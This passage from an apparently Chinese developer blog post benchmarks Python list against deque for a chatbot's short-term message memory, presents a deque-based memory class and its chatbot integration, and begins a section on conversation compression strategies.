<p><strong>优势：</strong></p>
<ul>
<li>✅ 自动管理容量，无需手动删除</li>
<li>✅ 时间复杂度 O(1)</li>
<li>✅ 代码更简洁</li>
</ul>
<h4 data-id="heading-10"><strong>性能对比</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
List vs Deque 性能对比测试

测试场景：
1. 连续添加消息
2. 满容量后继续添加
3. 获取所有消息
4. 混合操作
"""</span>

<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryWithList</span>:
    <span class="hljs-string">"""使用List实现的记忆"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_messages: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span></span>):
        self.max_messages = max_messages
        self.messages = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_message</span>(<span class="hljs-params">self, role: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:
        self.messages.append({<span class="hljs-string">"role"</span>: role, <span class="hljs-string">"content"</span>: content})
        
        <span class="hljs-comment"># 手动删除超出的消息</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.messages) &gt; self.max_messages:
            self.messages = self.messages[-self.max_messages:]
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_messages</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]:
        <span class="hljs-keyword">return</span> self.messages.copy()


<span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryWithDeque</span>:
    <span class="hljs-string">"""使用Deque实现的记忆"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_messages: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span></span>):
        self.messages = deque(maxlen=max_messages)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_message</span>(<span class="hljs-params">self, role: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:
        self.messages.append({<span class="hljs-string">"role"</span>: role, <span class="hljs-string">"content"</span>: content})
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_messages</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]:
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(self.messages)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_continuous_add</span>(<span class="hljs-params">memory_class, n: <span class="hljs-built_in">int</span> = <span class="hljs-number">1000</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""
    测试1：连续添加消息
    
    Args:
        memory_class: 内存类
        n: 添加次数
    
    Returns:
        耗时（毫秒）
    """</span>
    memory = memory_class(max_messages=<span class="hljs-number">20</span>)
    
    start = time.time()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"消息 <span class="hljs-subst">{i}</span>"</span>)
    elapsed = (time.time() - start) * <span class="hljs-number">1000</span>
    
    <span class="hljs-keyword">return</span> elapsed


<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_add_at_full_capacity</span>(<span class="hljs-params">memory_class, n: <span class="hljs-built_in">int</span> = <span class="hljs-number">1000</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""
    测试2：满容量后继续添加
    
    场景：已经有20条消息，继续添加n条
    这是最常见的场景（对话超过限制后）
    
    Returns:
        耗时（毫秒）
    """</span>
    memory = memory_class(max_messages=<span class="hljs-number">20</span>)
    
    <span class="hljs-comment"># 先填满</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):
        memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"初始消息 <span class="hljs-subst">{i}</span>"</span>)
    
    <span class="hljs-comment"># 测试满容量后的添加</span>
    start = time.time()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"新消息 <span class="hljs-subst">{i}</span>"</span>)
    elapsed = (time.time() - start) * <span class="hljs-number">1000</span>
    
    <span class="hljs-keyword">return</span> elapsed


<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_get_messages</span>(<span class="hljs-params">memory_class, n: <span class="hljs-built_in">int</span> = <span class="hljs-number">1000</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""
    测试3：获取消息
    
    Returns:
        耗时（毫秒）
    """</span>
    memory = memory_class(max_messages=<span class="hljs-number">20</span>)
    
    <span class="hljs-comment"># 先添加20条消息</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):
        memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"消息 <span class="hljs-subst">{i}</span>"</span>)
    
    <span class="hljs-comment"># 测试获取消息的速度</span>
    start = time.time()
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        messages = memory.get_messages()
    elapsed = (time.time() - start) * <span class="hljs-number">1000</span>
    
    <span class="hljs-keyword">return</span> elapsed


<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_mixed_operations</span>(<span class="hljs-params">memory_class, n: <span class="hljs-built_in">int</span> = <span class="hljs-number">1000</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""
    测试4：混合操作
    
    模拟真实对话场景：
    - 添加用户消息
    - 获取历史
    - 添加AI回复
    - 再次获取历史
    
    Returns:
        耗时（毫秒）
    """</span>
    memory = memory_class(max_messages=<span class="hljs-number">20</span>)
    
    start = time.time()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        <span class="hljs-comment"># 用户输入</span>
        memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"用户问题 <span class="hljs-subst">{i}</span>"</span>)
        <span class="hljs-comment"># 构建上下文（需要获取历史）</span>
        history = memory.get_messages()
        <span class="hljs-comment"># AI回复</span>
        memory.add_message(<span class="hljs-string">"assistant"</span>, <span class="hljs-string">f"AI回答 <span class="hljs-subst">{i}</span>"</span>)
    elapsed = (time.time() - start) * <span class="hljs-number">1000</span>
    
    <span class="hljs-keyword">return</span> elapsed


<span class="hljs-keyword">def</span> <span class="hljs-title function_">run_all_tests</span>():
    <span class="hljs-string">"""运行所有测试 - 增加测试规模"""</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"List vs Deque 性能对比测试（大规模）"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)
    <span class="hljs-built_in">print</span>()
    
    <span class="hljs-comment"># 增加测试规模</span>
    test_configs = [
        (<span class="hljs-string">"连续添加10000条消息"</span>, test_continuous_add, <span class="hljs-number">10000</span>),
        (<span class="hljs-string">"满容量后添加10000条"</span>, test_add_at_full_capacity, <span class="hljs-number">10000</span>),
        (<span class="hljs-string">"获取消息10000次"</span>, test_get_messages, <span class="hljs-number">10000</span>),
        (<span class="hljs-string">"混合操作10000次"</span>, test_mixed_operations, <span class="hljs-number">10000</span>),
        
        <span class="hljs-comment"># 添加超大规模测试</span>
        (<span class="hljs-string">"连续添加100000条消息"</span>, test_continuous_add, <span class="hljs-number">100000</span>),
        (<span class="hljs-string">"满容量后添加100000条"</span>, test_add_at_full_capacity, <span class="hljs-number">100000</span>),
    ]
    
    results = []
    
    <span class="hljs-keyword">for</span> test_name, test_func, n <span class="hljs-keyword">in</span> test_configs:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"测试场景: <span class="hljs-subst">{test_name}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">80</span>)
        
        <span class="hljs-comment"># 测试List</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  测试List..."</span>, end=<span class="hljs-string">" "</span>, flush=<span class="hljs-literal">True</span>)
        list_time = test_func(MemoryWithList, n)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✓ <span class="hljs-subst">{list_time:<span class="hljs-number">.2</span>f}</span>ms"</span>)
        
        <span class="hljs-comment"># 测试Deque</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  测试Deque..."</span>, end=<span class="hljs-string">" "</span>, flush=<span class="hljs-literal">True</span>)
        deque_time = test_func(MemoryWithDeque, n)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✓ <span class="hljs-subst">{deque_time:<span class="hljs-number">.2</span>f}</span>ms"</span>)
        
        <span class="hljs-comment"># 计算倍数</span>
        speedup = list_time / deque_time <span class="hljs-keyword">if</span> deque_time &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        winner = <span class="hljs-string">"Deque"</span> <span class="hljs-keyword">if</span> speedup &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"List"</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  → <span class="hljs-subst">{winner}</span>快 <span class="hljs-subst">{<span class="hljs-built_in">abs</span>(speedup):<span class="hljs-number">.1</span>f}</span>x"</span>)
        <span class="hljs-built_in">print</span>()
        
        results.append({
            <span class="hljs-string">"test"</span>: test_name,
            <span class="hljs-string">"list"</span>: list_time,
            <span class="hljs-string">"deque"</span>: deque_time,
            <span class="hljs-string">"speedup"</span>: speedup
        })
    
    <span class="hljs-comment"># 打印总结</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"测试总结"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)
    <span class="hljs-built_in">print</span>()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">'测试场景'</span>:&lt;<span class="hljs-number">30</span>}</span> <span class="hljs-subst">{<span class="hljs-string">'List(ms)'</span>:&lt;<span class="hljs-number">12</span>}</span> <span class="hljs-subst">{<span class="hljs-string">'Deque(ms)'</span>:&lt;<span class="hljs-number">12</span>}</span> <span class="hljs-subst">{<span class="hljs-string">'速度对比'</span>:&lt;<span class="hljs-number">10</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">80</span>)
    
    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results:
        winner = <span class="hljs-string">"🟢 Deque"</span> <span class="hljs-keyword">if</span> r[<span class="hljs-string">'speedup'</span>] &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"🔴 List"</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{r[<span class="hljs-string">'test'</span>]:&lt;<span class="hljs-number">30</span>}</span> <span class="hljs-subst">{r[<span class="hljs-string">'list'</span>]:&lt;<span class="hljs-number">12.2</span>f}</span> <span class="hljs-subst">{r[<span class="hljs-string">'deque'</span>]:&lt;<span class="hljs-number">12.2</span>f}</span> <span class="hljs-subst">{winner}</span> <span class="hljs-subst">{<span class="hljs-built_in">abs</span>(r[<span class="hljs-string">'speedup'</span>]):<span class="hljs-number">.1</span>f}</span>x"</span>)
    
    <span class="hljs-built_in">print</span>()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"关键结论:"</span>)
    
    <span class="hljs-comment"># 找出最大差异</span>
    max_speedup = <span class="hljs-built_in">max</span>(results, key=<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">abs</span>(x[<span class="hljs-string">'speedup'</span>] - <span class="hljs-number">1</span>))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  最大差异: <span class="hljs-subst">{max_speedup[<span class="hljs-string">'test'</span>]}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  → Deque快 <span class="hljs-subst">{max_speedup[<span class="hljs-string">'speedup'</span>]:<span class="hljs-number">.1</span>f}</span>x"</span>)
    
    <span class="hljs-comment"># 计算在添加场景下的平均提升</span>
    add_tests = [r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results <span class="hljs-keyword">if</span> <span class="hljs-string">'添加'</span> <span class="hljs-keyword">in</span> r[<span class="hljs-string">'test'</span>]]
    avg_add_speedup = <span class="hljs-built_in">sum</span>(r[<span class="hljs-string">'speedup'</span>] <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> add_tests) / <span class="hljs-built_in">len</span>(add_tests)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  添加操作平均: Deque快 <span class="hljs-subst">{avg_add_speedup:<span class="hljs-number">.1</span>f}</span>x"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    run_all_tests()
</code></pre>
<h4 data-id="heading-11"><strong>测试1：添加操作（核心场景）</strong></h4>























<table><thead><tr><th>规模</th><th>List</th><th>Deque</th><th>提升</th></tr></thead><tbody><tr><td>10,000次</td><td>6.13ms</td><td>3.28ms</td><td><strong>1.9x</strong></td></tr><tr><td>100,000次</td><td>36.19ms</td><td>17.72ms</td><td><strong>2.0x</strong></td></tr></tbody></table>
<p><strong>发现：规模越大，Deque优势越明显。在10万次操作时，Deque快2倍。</strong></p>
<h4 data-id="heading-12"><strong>测试2：混合操作（意外发现）</strong></h4>
<pre><code class="hljs language-diff" lang="diff">混合操作（添加+获取）10000次：
<span class="hljs-deletion">- List:  44.12ms  ✅</span>
<span class="hljs-deletion">- Deque: 125.34ms ❌</span>

什么？List反而更快？
</code></pre>
<p><strong>原因：<code>list(deque)</code>的转换开销很大</strong></p>
<p>每次调用<code>get_messages()</code>时，Deque需要转换成List：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_messages</span>(<span class="hljs-params">self</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(self.messages)  <span class="hljs-comment"># ⚠️ 每次都创建新list</span>
</code></pre>
<p>这给我们一个重要启示：<strong>不要频繁转换！</strong></p>
<h4 data-id="heading-13"><strong>优化方案</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ShortTermMemory</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_messages</span>(<span class="hljs-params">self</span>) -&gt; deque:
        <span class="hljs-comment"># 直接返回deque，不转换</span>
        <span class="hljs-keyword">return</span> self.messages
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">self, user_input</span>):
        <span class="hljs-comment"># 只在真正需要list时才转换</span>
        context = [system_prompt] + <span class="hljs-built_in">list</span>(self.memory.get_messages())
        <span class="hljs-comment"># 这样只转换一次，而不是每次操作都转换</span>
</code></pre>
<h4 data-id="heading-14"><strong>最终性能对比</strong></h4>
<p>在<strong>典型对话场景</strong>（满容量后继续添加）：</p>
<pre><code class="hljs language-markdown" lang="markdown">10万次操作：
<span class="hljs-bullet">-</span> List:  36.19ms
<span class="hljs-bullet">-</span> Deque: 17.72ms
<span class="hljs-bullet">-</span> Deque快 2.0x ✅

关键：Deque在核心场景（添加）快2倍，
<span class="hljs-code">     只要减少不必要的list转换即可。
</span></code></pre>
<h4 data-id="heading-15"><strong>为什么选Deque？</strong></h4>
<ol>
<li><strong>代码简洁</strong></li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># List需要手动管理</span>
<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(messages) &gt; max_messages:
    messages = messages[-max_messages:]

<span class="hljs-comment"># Deque自动管理</span>
<span class="hljs-comment"># 什么都不用做 ✅</span>
</code></pre>
<ol start="2">
<li><strong>性能更好</strong>（在核心场景）</li>
</ol>
<ul>
<li>添加操作：快 2.0x</li>
<li>只要优化转换，没有劣势</li>
</ul>
<ol start="3">
<li><strong>时间复杂度保证</strong></li>
</ol>
<ul>
<li>List切片：O(n)</li>
<li>Deque添加：O(1)</li>
</ul>
<p><strong>结论：选Deque，优化list转换，最佳实践。</strong></p>
<p>完整测试代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Ftests%2Ftest_list_vs_deque.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/tests/test_list_vs_deque.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<h3 data-id="heading-16"><strong>2.3 生产级实现</strong></h3>
<p>基于deque，我们实现一个完整的短期记忆管理类：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ShortTermMemory</span>:
    <span class="hljs-string">"""
    短期记忆管理器
    
    特点：
    - 自动管理容量（基于deque）
    - 极速读写（&lt;1ms）
    - 按轮数管理（1轮 = user + assistant）
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">10</span></span>):
        <span class="hljs-string">"""
        Args:
            max_turns: 最大轮数（默认10轮 = 20条消息）
        """</span>
        self.max_turns = max_turns
        self.max_messages = max_turns * <span class="hljs-number">2</span>
        self.messages: deque = deque(maxlen=self.max_messages)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_message</span>(<span class="hljs-params">self, role: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""添加一条消息"""</span>
        self.messages.append({
            <span class="hljs-string">"role"</span>: role,
            <span class="hljs-string">"content"</span>: content
        })
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_messages</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""获取所有消息"""</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(self.messages)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">clear</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""清空记忆"""</span>
        self.messages.clear()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_turn_count</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:
        <span class="hljs-string">"""获取当前轮数"""</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(self.messages) // <span class="hljs-number">2</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_full</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bool</span>:
        <span class="hljs-string">"""判断是否已满"""</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(self.messages) &gt;= self.max_messages
</code></pre>
<p><strong>关键设计：</strong></p>
<ul>
<li>按<strong>轮数</strong>而非消息数管理（更符合对话逻辑）</li>
<li><code>maxlen</code>参数让deque自动删除（无需手动管理）</li>
<li>提供<code>is_full()</code>等辅助方法（方便后续压缩策略判断）</li>
</ul>
<p>完整代码见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Fsrc%2Fmemory%2Fshort_term.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/src/memory/short_term.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<h3 data-id="heading-17"><strong>2.4 集成到Chatbot</strong></h3>
<p>有了短期记忆，如何集成到Chatbot中？核心流程是：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryChatbot</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm, system_prompt: <span class="hljs-built_in">str</span> = <span class="hljs-string">"你是AI助手"</span></span>):
        self.llm = llm
        self.system_prompt = system_prompt
        self.memory = ShortTermMemory(max_turns=<span class="hljs-number">10</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">self, user_input: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-comment"># 1. 保存用户输入到记忆</span>
        self.memory.add_message(<span class="hljs-string">"user"</span>, user_input)
        
        <span class="hljs-comment"># 2. 构建上下文：system + 历史消息</span>
        messages = [
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: self.system_prompt}
        ]
        messages.extend(self.memory.get_messages())
        
        <span class="hljs-comment"># 3. 调用LLM</span>
        response = self.llm.chat(messages)
        
        <span class="hljs-comment"># 4. 保存AI回复到记忆</span>
        self.memory.add_message(<span class="hljs-string">"assistant"</span>, response)
        
        <span class="hljs-keyword">return</span> response
</code></pre>
<p><strong>数据流：</strong></p>
<pre><code class="hljs language-sql" lang="sql">用户输入 "我叫Tom"
    ↓
存入memory: [{"role": "user", "content": "我叫Tom"}]
    ↓
构建上下文: [<span class="hljs-keyword">system</span>, <span class="hljs-keyword">user</span>消息]
    ↓
调用LLM → 返回 "你好Tom！"
    ↓
存入memory: [<span class="hljs-keyword">user</span>消息, assistant消息]
</code></pre>
<p><strong>效果演示：</strong></p>
<pre><code class="hljs language-python" lang="python">bot = MemoryChatbot(llm)

<span class="hljs-comment"># 第1轮</span>
bot.chat(<span class="hljs-string">"我叫Tom"</span>)
<span class="hljs-comment"># Bot: "你好Tom！"</span>

<span class="hljs-comment"># 第2轮</span>
bot.chat(<span class="hljs-string">"我在上海工作"</span>)
<span class="hljs-comment"># Bot: "上海是个很棒的城市！"</span>

<span class="hljs-comment"># 第3轮 - 测试记忆</span>
bot.chat(<span class="hljs-string">"我叫什么名字？在哪工作？"</span>)
<span class="hljs-comment"># Bot: "你叫Tom，在上海工作" ✅ 记住了！</span>
</code></pre>
<p>完整代码见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Fsrc%2Fchatbot.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/src/chatbot.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<h3 data-id="heading-18"><strong>2.5 短期记忆的局限性</strong></h3>
<p>短期记忆虽然简单高效，但有三个明显的问题：</p>
<h4 data-id="heading-19"><strong>问题1：容量有限</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 设置最多保存10轮</span>
memory = ShortTermMemory(max_turns=<span class="hljs-number">10</span>)

<span class="hljs-comment"># 对话20轮后</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):
    memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"消息<span class="hljs-subst">{i}</span>"</span>)
    memory.add_message(<span class="hljs-string">"assistant"</span>, <span class="hljs-string">f"回复<span class="hljs-subst">{i}</span>"</span>)

<span class="hljs-comment"># 结果：前10轮被丢弃</span>
<span class="hljs-built_in">print</span>(memory.get_turn_count())  <span class="hljs-comment"># 10轮</span>
<span class="hljs-comment"># 第1轮的"我叫Tom"已经找不到了！❌</span>
</code></pre>
<h4 data-id="heading-20"><strong>问题2：简单粗暴的删除策略</strong></h4>
<pre><code class="hljs language-python" lang="python">重要信息：<span class="hljs-string">"我叫Tom"</span>（第<span class="hljs-number">1</span>轮）
不重要信息：<span class="hljs-string">"谢谢"</span>（第<span class="hljs-number">19</span>轮）

<span class="hljs-number">10</span>轮后，<span class="hljs-string">"我叫Tom"</span>被删除
但<span class="hljs-string">"谢谢"</span>被保留

这不合理！❌
</code></pre>
<p>短期记忆<strong>不区分信息的重要性</strong>，只按时间顺序删除。</p>
<h4 data-id="heading-21"><strong>问题3：Token浪费</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-number">20</span>轮对话 = <span class="hljs-number">20</span>条消息 ≈ <span class="hljs-number">8000</span> tokens

其中可能包含：
- <span class="hljs-string">"嗯"</span>、<span class="hljs-string">"好的"</span>、<span class="hljs-string">"谢谢"</span> 等无意义内容
- 重复的信息
- 可以压缩的冗长描述

这些都占用宝贵的上下文窗口！
</code></pre>
<p>短期记忆解决了<strong>基本的记忆能力</strong>，但三个局限性告诉我们：</p>
<p><strong>我们需要更智能的策略：</strong></p>
<ol>
<li>在有限空间内保存<strong>更多信息</strong></li>
<li>保留<strong>重要内容</strong>，删除<strong>无关内容</strong></li>
<li><strong>压缩冗长对话</strong>，节省token</li>
</ol>
<p>好的！让我们写 <strong>3.1 为什么需要压缩？</strong> 🗜️</p>
<hr/>
<h2 data-id="heading-22"><strong>三、4种压缩策略详解</strong></h2>
<h3 data-id="heading-23"><strong>3.1 为什么需要压缩？</strong></h3>
<p>在第二章我们看到，短期记忆有三个致命问题：</p>
<ol>
<li>容量固定，重要信息会丢失</li>
<li>不区分信息重要性</li>
<li>Token浪费严重</li>
</ol>
<p>现在问题来了：<strong>如何在有限的空间内，保存更多有价值的信息？</strong></p>
<p>答案是：<strong>压缩</strong>。</p>
<h4 data-id="heading-24"><strong>压缩要解决的核心矛盾</strong></h4>
<pre><code class="hljs language-diff" lang="diff">矛盾：
<span class="hljs-deletion">- LLM上下文窗口有限（如8K tokens）</span>
<span class="hljs-deletion">- 用户对话可能很长（50轮、100轮...）</span>
<span class="hljs-deletion">- 每个token都要花钱</span>

目标：
<span class="hljs-deletion">- 用更少的token</span>
<span class="hljs-deletion">- 保留更多的信息</span>
<span class="hljs-deletion">- 保持对话连贯性</span>
</code></pre>
<h4 data-id="heading-25"><strong>一个具体的例子</strong></h4>
<p>假设我们有这样一段对话历史（10轮，20条消息）：</p>
<pre><code class="hljs language-python" lang="python">原始对话（未压缩）：
[
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我叫Tom"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你好Tom！很高兴认识你。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我在上海工作"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"上海是个很国际化的城市！你在哪个行业？"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我是AI工程师"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"AI工程师是个很有前景的职业！"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我最近在研究Agent"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Agent是很前沿的方向！"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"遇到了通信延迟问题"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"通信延迟可以考虑优化消息队列。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"用什么消息队列？"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"可以考虑Redis或RabbitMQ。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Redis性能怎么样？"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Redis非常快，单机QPS可达10万+。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"好的，谢谢"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"不客气！有问题随时问。"</span>},
